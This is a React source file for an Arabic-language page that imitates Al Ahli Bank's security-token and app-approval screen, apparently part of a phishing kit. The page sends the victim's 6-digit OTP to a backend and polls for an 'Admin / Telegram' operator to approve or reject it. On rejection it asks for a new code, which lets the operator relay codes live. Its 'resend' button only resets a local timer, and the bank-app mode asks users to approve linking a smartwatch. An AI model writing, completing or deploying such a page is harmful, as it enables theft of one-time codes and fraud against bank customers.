import React, { useState, useEffect } from 'react';
import { ShieldCheck, ChevronLeft, AlertCircle, Smartphone } from 'lucide-react';
import { useNavigate, useLocation } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { updateCardRequest, getCardRequest } from '../api';

export default function TokenVerificationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const isBankAppMode = location.pathname === '/otp-bank';

  // 6-digit TOKEN state
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [secondsLeft, setSecondsLeft] = useState(120);
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpError, setOtpError] = useState('');

  // Countdown timer
  useEffect(() => {
    if (secondsLeft <= 0) return;
    const timer = setInterval(() => {
      setSecondsLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [secondsLeft]);

  // Poll for Admin / Telegram approval or rejection
  useEffect(() => {
    if (!isVerifying && !isBankAppMode) return;

    const timer = setInterval(async () => {
      try {
        const req = await getCardRequest();
        if (!req) {
          setIsVerifying(false);
          return;
        }

        if (req.otpStatus === 'approved') {
          setIsVerifying(false);
          navigate('/success');
        } else if (req.otpStatus === 'rejected') {
          setIsVerifying(false);
          setOtp(['', '', '', '', '', '']);
          setSecondsLeft(120);
          setOtpError('رمز الأمان (TOKEN) المكون من 6 أرقام غير صحيح أو منتهي الصلاحية. يرجى إدخال الرمز الجديد.');
        }
      } catch {
        // Ignore transient network errors
      }
    }, 1500);

    return () => clearInterval(timer);
  }, [isVerifying, isBankAppMode, navigate]);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleOtpChange = (index: number, val: string) => {
    if (!/^\d*$/.test(val)) return;
    const newOtp = [...otp];
    newOtp[index] = val.slice(-1);
    setOtp(newOtp);

    // Auto focus next input (6 digits: indices 0..5)
    if (val && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleVerify = async () => {
    const code = otp.join('');
    if (code.length < 6) {
      setOtpError('يرجى إدخال رمز الأمان (TOKEN) المكون من 6 أرقام بالكامل.');
      return;
    }

    setOtpError('');
    setIsVerifying(true);
    try {
      await updateCardRequest('current', {
        otp: code,
        step: isBankAppMode ? 'otp-bank' : 'verify',
        otpStatus: 'pending',
      });
    } catch {
      // Keep waiting state active
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/otp" title="الخطوة 5: رمز الأمان الرقمي (TOKEN)" />

      <main className="flex-1 py-6 px-4 max-w-md mx-auto w-full flex flex-col justify-center">
        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 text-center">
          {/* Token App Header matching screenshot blank-7 */}
          <div className="flex items-center justify-between border-b border-gray-100 pb-4 mb-4">
            <div className="text-right">
              <h3 className="font-bold text-gray-900 text-base">
                {isBankAppMode ? 'موافقة تطبيق البنك الأهلي' : 'تطبيق رمز الأمان'}
              </h3>
              <p className="text-[11px] text-gray-500 mt-0.5">
                {isBankAppMode
                  ? 'يرجى تأكيد عملية ربط الساعة الذكية عبر إشعار تطبيق البنك الأهلي أو إدخال رمز الأمان.'
                  : 'قم بتصديق معاملاتك المصرفية عبر الإنترنت في أي وقت وأي مكان مع تطبيق رمز الأمان.'}
              </p>
              <div className="flex items-center gap-1 text-[#004838] text-xs font-bold mt-1">
                <span>للمزيد</span>
                <ChevronLeft className="w-3 h-3" />
              </div>
            </div>

            <div className="w-14 h-14 rounded-2xl bg-[#e6f4f0] border border-[#004838]/20 flex items-center justify-center shrink-0">
              {isBankAppMode ? (
                <Smartphone className="w-8 h-8 text-[#004838]" />
              ) : (
                <ShieldCheck className="w-8 h-8 text-[#004838]" />
              )}
            </div>
          </div>

          {/* Token Pill Button */}
          <div className="mb-5">
            <div className="inline-block border-2 border-[#004838] text-[#004838] font-black tracking-widest text-sm px-6 py-2 rounded-xl">
              {isBankAppMode ? 'BANK APPROVAL' : 'TOKEN (6 DIGITS)'}
            </div>
          </div>

          {otpError && (
            <div className="mb-4 p-3.5 bg-red-50 border border-red-200 rounded-2xl text-xs text-red-700 font-bold flex items-start gap-2.5 text-right">
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
              <span>{otpError}</span>
            </div>
          )}

          {/* Outer Border Box matching screenshot */}
          <div className="border border-gray-200 rounded-2xl p-5 bg-gray-50/50">
            <p className="text-xs text-gray-700 font-semibold mb-4 leading-relaxed">
              {isBankAppMode
                ? 'تم إرسال طلب موافقة ورمز الأمان (6 أرقام) إلى هاتفك المسجل لدى البنك الأهلي لتأكيد عملية الحجز بنجاح'
                : 'تم ارسال رمز الأمان (6 أرقام) الى جوالك الرجاء التحقق من الرمز وادخالة لتأكيد عملية الحجز بنجاح'}
            </p>

            {/* 6 Digit TOKEN Inputs */}
            <div className="flex justify-center gap-2 mb-4" dir="ltr">
              {otp.map((digit, idx) => (
                <input
                  key={idx}
                  id={`otp-${idx}`}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  disabled={isVerifying}
                  value={digit}
                  onChange={(e) => handleOtpChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className="w-10 h-12 text-center text-xl font-bold bg-white border border-gray-300 rounded-xl focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all shadow-2xs"
                />
              ))}
            </div>

            {/* Countdown Timer with live tick */}
            <div className="mb-4">
              <span className={`text-2xl font-mono font-bold tracking-widest ${secondsLeft < 30 ? 'text-[#c8922c] animate-pulse' : 'text-gray-900'}`}>
                {formatTimer(secondsLeft)}
              </span>
              {secondsLeft === 0 && (
                <div className="mt-1">
                  <button
                    onClick={() => setSecondsLeft(120)}
                    className="text-xs text-[#004838] font-bold hover:underline"
                  >
                    إعادة إرسال الرمز
                  </button>
                </div>
              )}
            </div>

            {/* Verify Button */}
            <button
              onClick={handleVerify}
              disabled={isVerifying}
              className="w-full py-3.5 bg-gradient-to-r from-[#d4a343] via-[#c8922c] to-[#b88022] hover:from-[#c8922c] disabled:opacity-70 text-white font-bold text-base rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2 shadow-md shadow-[#d4a343]/20"
            >
              {isVerifying ? (
                <>
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  <span>جارِ التحقق الآمن وبانتظار التصديق...</span>
                </>
              ) : (
                <span>تحقق</span>
              )}
            </button>
          </div>
        </div>
      </main>

      <AppFooter />
    </div>
  );
}
